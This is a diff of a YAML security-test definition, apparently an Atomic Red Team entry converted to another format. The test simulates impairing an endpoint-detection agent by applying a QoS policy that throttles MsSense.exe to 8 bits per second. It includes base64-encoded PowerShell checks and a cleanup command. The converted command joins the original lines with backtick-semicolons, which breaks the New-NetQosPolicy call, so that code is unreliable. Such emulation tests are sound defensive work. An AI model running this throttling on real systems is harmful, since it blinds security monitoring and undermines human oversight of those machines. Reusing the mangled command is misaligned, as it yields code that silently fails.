@@ -1,4 +1,4 @@
-- id: 07a2378f-4676-5dfe-85e7-9a90abe7074d
+- requirements: []
   name: Soumaia ART Tests - Throttle Cybersecurity Agent Network Traffic via QoS Policy
   description: 'This test simulates an adversary impairing security agent capabilities by applying Policy-Based Quality of Service (QoS) throttling rules to security agent processes.
 
@@ -18,20 +18,15 @@
 
     This technique is inspired by research from Zero Salarium and the associated EDRChoker tool (https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html), which demonstrates how adversaries can exploit the reliance of modern EDR solutions on persistent, low-latency cloud connectivity to create a temporary loss of visibility without triggering traditional tampering detections. (requires elevation)'
   tactic: defense-impairment
-  technique:
-    attack_id: T1685
-    name: Disable or Modify Tools
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIABOAGUAdwAtAE4AZQB0AFEAbwBzAFAAbwBsAGkAYwB5ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAB7ACAAZQB4AGkAdAAgADAAIAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAUQBvAFMAIABjAG0AZABsAGUAdABzACAAYQByAGUAIABwAGEAcgB0ACAAbwBmACAAVwBpAG4AZABvAHcAcwA7ACAAZQBuAHMAdQByAGUAIAByAHUAbgBuAGkAbgBnACAAbwBuACAAcwB1AHAAcABvAHIAdABlAGQAIAB2AGUAcgBzAGkAbwBuACIACgA=
-          }
-          New-NetQosPolicy -Name "CyberSecurityAgentThrottlingTest" `
-            -AppPathNameMatchCondition "MsSense.exe" `
-            -ThrottleRateActionBitsPerSecond 8 `
-            -PolicyStore ActiveStore
-        cleanup: |-
-          Get-NetQosPolicy -PolicyStore ActiveStore | Where-Object { $_.Name -like "*CyberSecurityAgentThrottlingTest*" } | Remove-NetQosPolicy -Confirm:$false
+  technique_id: T1685
+  technique_name: Disable or Modify Tools
+  executors:
+  - cleanup:
+    - Get-NetQosPolicy -PolicyStore ActiveStore | Where-Object { $_.Name -like "*CyberSecurityAgentThrottlingTest*" } | Remove-NetQosPolicy -Confirm:$false
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIABOAGUAdwAtAE4AZQB0AFEAbwBzAFAAbwBsAGkAYwB5ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAB7ACAAZQB4AGkAdAAgADAAIAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAUQBvAFMAIABjAG0AZABsAGUAdABzACAAYQByAGUAIABwAGEAcgB0ACAAbwBmACAAVwBpAG4AZABvAHcAcwA7ACAAZQBuAHMAdQByAGUAIAByAHUAbgBuAGkAbgBnACAAbwBuACAAcwB1AHAAcABvAHIAdABlAGQAIAB2AGUAcgBzAGkAbwBuACIACgA= }; New-NetQosPolicy -Name "CyberSecurityAgentThrottlingTest" `; -AppPathNameMatchCondition "MsSense.exe" `; -ThrottleRateActionBitsPerSecond 8 `; -PolicyStore ActiveStore
+  id: 07a2378f-4676-5dfe-85e7-9a90abe7074d
